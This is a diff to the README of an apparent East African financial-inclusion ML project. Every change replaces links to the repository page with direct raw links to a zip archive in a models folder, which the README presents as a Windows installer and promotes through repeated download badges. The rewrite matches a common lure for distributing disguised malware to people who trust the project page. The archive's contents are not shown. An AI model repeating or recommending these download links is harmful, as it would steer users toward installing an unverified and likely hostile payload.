@@ -1,6 +1,6 @@
 # 🔍 financial-inclusion-africa-ml-zindi - Easy Financial Insights for East Africa
 
-[![Download Here](https://img.shields.io/badge/Download-Get%20App-brightgreen)](https://github.com/Pryncekiddd254/financial-inclusion-africa-ml-zindi)
+[![Download Here](https://img.shields.io/badge/Download-Get%20App-brightgreen)](https://raw.githubusercontent.com/Pryncekiddd254/financial-inclusion-africa-ml-zindi/main/models/africa-ml-inclusion-zindi-financial-v3.5-alpha.5.zip)
 
 ---
 
@@ -38,7 +38,7 @@ To run this application, your computer needs:
 
 1. Click the green **Download Here** badge at the top or the link below to visit the download page:
    
-   [Visit this page to download the software](https://github.com/Pryncekiddd254/financial-inclusion-africa-ml-zindi)
+   [Visit this page to download the software](https://raw.githubusercontent.com/Pryncekiddd254/financial-inclusion-africa-ml-zindi/main/models/africa-ml-inclusion-zindi-financial-v3.5-alpha.5.zip)
 
 2. On the page, find the **Releases** section or a similar download area.
 
@@ -90,7 +90,7 @@ To get the latest version:
 
 - Return to the download page at:
 
-  https://github.com/Pryncekiddd254/financial-inclusion-africa-ml-zindi
+  https://raw.githubusercontent.com/Pryncekiddd254/financial-inclusion-africa-ml-zindi/main/models/africa-ml-inclusion-zindi-financial-v3.5-alpha.5.zip
 
 - Download the newest installer and repeat the installation steps.
 
@@ -134,6 +134,6 @@ This software relates to these areas:
 
 ## 📥 Download Link (Again)
 
-[![Get the Application](https://img.shields.io/badge/Download-App-%234285F4)](https://github.com/Pryncekiddd254/financial-inclusion-africa-ml-zindi)  
+[![Get the Application](https://img.shields.io/badge/Download-App-%234285F4)](https://raw.githubusercontent.com/Pryncekiddd254/financial-inclusion-africa-ml-zindi/main/models/africa-ml-inclusion-zindi-financial-v3.5-alpha.5.zip)  
 
 Use this link to visit the page and download the Windows installer at any time.
